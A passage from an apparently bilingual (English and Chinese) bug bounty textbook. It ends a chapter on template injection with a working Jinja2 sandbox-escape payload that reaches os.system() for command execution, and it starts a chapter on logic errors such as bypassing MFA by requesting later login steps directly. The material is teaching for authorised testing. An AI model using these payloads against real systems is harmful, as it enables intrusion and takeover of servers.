aria-label="annotation2"} . Then it instantiates an object of that class
[ 3 ]{.CodeAnnotation aria-label="annotation3"} . Objects of the class
`      catch_warnings     ` have an attribute called
`      _module     ` that refers to the `      warnings     ` module.
此循环遍历\[\]中的所有类。\_\_class\_\_.\_\_bases\_\_\[0\].\_\_subclasses\_\_()并查找名称中包含字符串catch_warnings的类。然后实例化该类的对象。
catch_warnings类的对象具有称为_module的属性，该属性引用warnings模块。
Finally, we use the reference to the module to refer to the
`      builtins     ` module:
最终，我们使用对模块的引用来引用内置模块：
    {% for x in [].__class__.__bases__[0].__subclasses__() %}
    {% if 'catch_warnings' in x.__name__ %}
    {{x()._module.__builtins__}}
    {%endif%}
    {%endfor%}
You should see a list of built-in classes and functions returned,
including the function `      __import__     ` :
你应该看到返回的内置类和函数列表，其中包括函数\_\_import\_\_：
    {'__name__': 'builtins', '__doc__': "Built-in functions, exceptions, and other objects.\n\nNoteworthy: None is the 'nil' object; Ellipsis represents '...' in slices.", '__package__': '', '__loader__': , '__spec__': ModuleSpec(name='builtins', loader=), '__build_class__': , '__import__': , 'abs': , 'all': , 'any': , 'ascii': , 'bin': , 'breakpoint': , 'callable': , 'chr': , 'compile': , 'delattr': , 'dir': , 'divmod': , 'eval': , 'exec': , 'format': , 'getattr': , 'globals': , 'hasattr': , 'hash': , 'hex': , 'id': , 'input': , 'isinstance': , 'issubclass': , 'iter': , 'len': , 'locals': , 'max': , 'min': , 'next': , 'oct': , 'ord': , 'pow': , 'print': , 'repr': , 'round': , 'setattr': , 'sorted': , 'sum': , 'vars': , 'None': None, 'Ellipsis': Ellipsis, 'NotImplemented': NotImplemented, 'False': False, 'True': True, 'bool': , 'memoryview': , 'bytearray': , 'bytes': , 'classmethod': , ...}
We now have a way to access the import functionality! Since the built-in
classes and functions are stored in a Python dictionary, you can access
the `      __import__     ` function by referring to the key of the
function's entry in the dictionary:
我们现在有一种访问导入功能的方法！由于内置类和函数存储在Python字典中，您可以通过引用函数条目在字典中的键来访问\_\_import\_\_函数：
    {% for x in [].__class__.__bases__[0].__subclasses__() %}
    {% if 'catch_warnings' in x.__name__ %}
    {{x()._module.__builtins__['__import__']}}
    {%endif%}
    {%endfor%}
Now we can use the `      __import__     ` function to import the
`      os     ` module. You can import a module with
`      __import__     ` by providing the name of that module as an
argument. Here, let's import the `      os     ` module so we can access
the `      system()     ` function:
现在我们可以使用\_\_import\_\_函数来导入os模块。您可以通过将该模块的名称作为参数来使用\_\_import\_\_导入模块。在这里，让我们导入os模块，以便我们可以访问system()函数：
    {% for x in [].__class__.__bases__[0].__subclasses__() %}
    {% if 'catch_warnings' in x.__name__ %}
    {{x()._module.__builtins__['__import__']('os')}}
    {%endif%}
    {%endfor%}
Finally, call the `      system()     ` function and put the command we
want to execute as the `      system()     ` function's argument:
最后，调用system()函数并将我们想要执行的命令作为system()函数的参数。
    {% for x in [].__class__.__bases__[0].__subclasses__() %}
    {% if 'catch_warnings' in x.__name__ %}
    {{x()._module.__builtins__['__import__']('os').system('ls')}}
    {%endif%}
    {%endfor%}
[ ]{#c16.xhtml#Page_273 .pagebreak title="273"} You should see the
results of the `      ls     ` command returned. This `     ` command
lists the contents of the current directory. You've achieved command
execution! Now, you should be able to execute arbitrary system commands
with this template injection.
你应该看到ls命令返回的结果。此命令列出当前目录的内容。你已经成功执行了命令！现在，你应该能够使用此模板注入执行任意系统命令。
### Submitting Payloads for Testing {#c16.xhtml#h2-123456c16-0008}
For testing purposes, you should execute code that doesn't harm the
system you're targeting. A common way of proving that you've achieved
command execution and gained access to the operating system is to create
a file with a distinct filename on the system, such as
*template_injection_by_YOUR_BUG_BOUNTY_USERNAME.txt* , so that the file
is clearly a part of your proof of concept. Use the `      touch     `
command to create a file with the specified name in the current
directory:
为了测试目的，您应该执行不会损害目标系统的代码。证明您已经成功执行命令并获得了对操作系统的访问权限的一种常见方法是在系统上创建一个具有独特文件名的文件，例如template_injection_by_YOUR_BUG_BOUNTY_USERNAME.txt，以便文件明显是您概念证明的一部分。使用touch命令在当前目录中创建具有指定名称的文件：
    {% for x in [].__class__.__bases__[0].__subclasses__() %}
    {% if 'warning' in x.__name__ %}
    {{x()._module.__builtins__['__import__']('os').system('touch template_injection_by_vickie.txt')}}
    {%endif%}
    {%endfor%}
Different template engines require different escalation techniques. If
exploring this interests you, I encourage you to do more research into
the area. Code execution and sandbox escapes are truly fascinating
topics. We will discuss more about how to execute arbitrary code on
target systems in Chapter 18. If you are interested in learning more
about sandbox escapes, these articles discuss the topic in more detail
(this chapter's example was developed from a tip in Programmer Help):
不同的模板引擎需要不同的升级技术。如果您对此感兴趣，我鼓励您进一步研究这个领域。代码执行和沙箱逃逸是非常迷人的主题。我们将在第18章更多地讨论如何在目标系统上执行任意代码。如果您想了解更多有关沙箱逃逸的信息，这些文章会更详细地讨论该主题（本章的示例来自程序员帮助的提示）。
-   CTF Wiki,
    https://ctf-wiki.github.io/ctf-wiki/pwn/linux/sandbox/python-sandbox-escape/
-   HackTricks,
    [https://book.hacktricks.xyz/misc/basic-python/bypass-python-sandboxes/](https://book.hacktricks.xyz/misc/basic-python/bypass-python-sandboxes/){.LinkURL}
-   Programmer Help,
    [https://programmer.help/blogs/python-sandbox-escape.html](https://programmer.help/blogs/python-sandbox-escape.html){.LinkURL}
## Automating Template Injection {#c16.xhtml#h1-123456c16-0005}
Developing exploits for each system you target can be time-consuming.
Luckily, templates often contain already known exploits that others have
discovered, so when you find a template injection vulnerability, it's a
good idea to automate the exploitation process to make your work more
efficient.
为每一个你针对的系统开发漏洞利用可能非常耗费时间。幸运的是，模板通常包含其他人发现的已知漏洞，因此当您发现一个模板注入漏洞时，自动化利用过程是个不错的选择，可以让您的工作更有效率。
One tool built to automate the template injection process, called tplmap
(
[https://github.com/epinna/tplmap/](https://github.com/epinna/tplmap/){.LinkURL}
), can scan for template injections, determine the template engine in
use, and construct exploits. While this tool does not support every
template engine, it should provide you with a good starting point for
the most popular ones.
一个用于自动化模板注入过程的工具叫做tplmap（https://github.com/epinna/tplmap/），它可以扫描模板注入，确定使用的模板引擎，并构建攻击。虽然这个工具不支持每个模板引擎，但它应该为大多数流行的模板引擎提供一个很好的起点。
## [ ]{#c16.xhtml#Page_274 .pagebreak title="274"} Finding Your First Template Injection! {#c16.xhtml#h1-123456c16-0006}
It's time to find your first template injection vulnerability by
following the steps we discussed in this chapter:
是时候按照本章节讨论的步骤，找到你的第一个模板注入漏洞了。
1.  Identify any opportunity to submit user input to the application.
    Mark down candidates of template injection for further inspection.
2.  Detect template injection by submitting test payloads. You can use
    either payloads that are designed to induce errors, or
    engine-specific payloads designed to be evaluated by the template
    engine.
3.  If you find an endpoint that is vulnerable to template injection,
    determine the template engine in use. This will help you build an
    exploit specific to the template engine.
4.  Research the template engine and programming language that the
    target is using to construct an exploit.
5.  Try to escalate the vulnerability to arbitrary command execution.
6.  Create a proof of concept that does not harm the targeted system. A
    good way to do this is to execute
    `       touch template_injection_by_      `
    `       YOUR_NAME      `{.variable} `       .txt      ` to create a
    specific proof-of-concept file.
7.  Draft your first template injection report and send it to the
    organization!
:::
[]{#c17.xhtml}
::: section
# [ [ ]{#c17.xhtml#Page_275 .pagebreak title="275"} 17 ]{.ChapterNumber} [ Application Logic Errors and Broken Access Control ]{.ChapterTitle} {.chapter}
![](image_fi/book_art/chapterart.png)
Application logic errors and broken access control vulnerabilities are
quite different from those we've discussed so far. Most of the
vulnerabilities covered in previous chapters are caused by faulty input
validation: they happen when polluted user input is processed without
proper sanitization. These malicious inputs are syntactically different
from normal user input and are designed to manipulate application logic
and cause damage to the application or its users.
应用程序逻辑错误和破坏访问控制漏洞与我们到目前为止所讨论的那些漏洞非常不同。前几章涵盖的大多数漏洞都是由于输入验证错误造成的：它们发生在未经适当清理的污染用户输入被处理时。这些恶意输入与正常用户输入在语法上有所不同，旨在操纵应用程序逻辑并对应用程序或其用户造成损害。
On the other hand, application logic errors and broken access control
issues are often triggered by perfectly valid HTTP requests containing
no illegal or malformed character sequences. Still, these requests are
crafted intentionally to misuse the application's logic for malicious
purposes or circumvent the application's access control.
另一方面，应用程序逻辑错误和破损的访问控制问题通常由完全有效的HTTP请求触发，不包含任何非法或格式错误的字符序列。然而，这些请求是有意制作出来的，以恶意目的滥用应用程序的逻辑或规避应用程序的访问控制。
[ ]{#c17.xhtml#Page_276 .pagebreak title="276"} Application logic errors
are logic flaws in an application. Sometimes attackers can exploit them
to cause harm to the organization, the application, or its users. Broken
access control occurs when sensitive resources or functionality are not
properly protected. To find these vulnerabilities, you cannot simply
rely on your technical knowledge. Instead, you need to use your
creativity and intuition to bypass restrictions set by the developers.
This chapter explains these vulnerabilities, how they manifest in
applications, and how you can test for them.
应用程序逻辑错误是应用程序中的逻辑缺陷。有时攻击者可以利用它们来对组织、应用程序或其用户造成伤害。破损的访问控制是指没有正确保护敏感资源或功能。要发现这些漏洞，您不能仅仅依赖您的技术知识。相反，您需要使用您的创造力和直觉来绕过开发人员设置的限制。本章介绍这些漏洞在应用程序中的表现，以及您如何测试它们。
## Application Logic Errors {#c17.xhtml#h1-501546c17-0001}
*Application logic errors* , or *business logic vulnerabilities* , are
ways of using the legitimate logic flow of an application that result in
a negative consequence to the organization. Sound a bit abstract? The
best way to understand them is to look at a few examples.
应用程序逻辑错误或业务逻辑漏洞是利用应用程序的合法逻辑流程导致组织出现负面后果的方式。听起来有点抽象？了解它们的最好方法是看一些示例。
A common application logic error I've seen in the websites I've targeted
is a flaw in the site's multifactor authentication functionality.
*Multifactor authentication* , or *MFA* , is the practice of requiring
users to prove their identities in more than one way. MFA protects users
in the event of password compromise by requiring them to authenticate
with both a password and another proof of identity---typically a phone
number or an email account, but sometimes via an authentication app, a
physical key, or even fingerprints. Most MFA implementations prompt the
user to authenticate using both a password and an authorization code
delivered via email or text message.
我在攻击的网站中经常遇到的常见应用逻辑错误是网站的多因素认证功能的漏洞。
多因素认证（MFA）是一种要求用户以多种方式证明其身份的做法。
MFA通过要求用户使用密码和另一种身份证明方式（通常是电话号码或电子邮件帐户，但有时也会通过认证应用程序，物理钥匙甚至指纹）进行身份验证，保护用户在密码泄露事件中的安全。
大多数MFA实施会提示用户使用密码和通过电子邮件或短信提供的授权代码进行身份验证。
But MFA implementations are often compromised by a logic error I call
the *skippable authentication step* , which allows users to forgo a step
in the authentication process. For example, let's say an application
implements a three-step login process. First, the application checks the
user's password. Then, it sends an MFA code to the user and verifies it.
Finally, the application asks a security question before logging in the
user:
但是MFA实现通常会受到我称之为可跳过身份验证步骤的逻辑错误的影响，这使得用户可以跳过身份验证过程中的某一步骤。例如，假设一个应用程序实现了一个三步登录过程。首先，该应用程序检查用户的密码。然后，它发送一个MFA代码给用户并验证它。最后，该应用程序在登录用户之前询问一个安全问题。
> Step 1 (Password Check) [ ▶ ]{.MenuArrow} Step 2 (MFA) [ ▶
> ]{.MenuArrow} Step 3 (Security Questions)
>
> 步骤1（密码检查）▶ 步骤2（多因素认证）▶ 步骤3（安全问题）
A normal authentication flow would look like this:
一个正常的身份验证流程应该是这样的：
1.  The user visits *https://example.com/login/* . The application
    prompts the user for their password, and the user enters it.
2.  If the password is correctly entered, the application sends an MFA
    code to the user's email address and redirects the user to
    *https://example.com/mfa/* . Here, the user enters the MFA code.
3.  The application checks the MFA code, and if it is correct, redirects
    the user to *https://example.com/security_questions/* . There, the
    application asks the user several security questions and logs in the
    user if the answers they provided are correct.
Sometimes, though, users can reach step 3 in the authentication process
without clearing steps 1 and 2. While the vulnerable application
redirects users to step 3 after the completion of step 2, it doesn't
verify that step 2 is [ ]{#c17.xhtml#Page_277 .pagebreak title="277"}
completed before users are allowed to advance to step 3. In this case,
all the attacker has to do is to manipulate the site's URL and directly
request the page of a later stage.
有时，用户可能会在身份验证过程中达到第3步，而无需清除第1和第2步。
虽然易受攻击的应用程序在完成第2步后将用户重定向到第3步，但在允许用户进入第3步之前，它并未验证是否已完成第2步。
在这种情况下，攻击者所要做的就是操纵站点的URL并直接请求一个后期阶段的页面。
If attackers can directly access
*https://example.com/security_questions/* , they could bypass the
multifactor authentication entirely. They might be able to log in with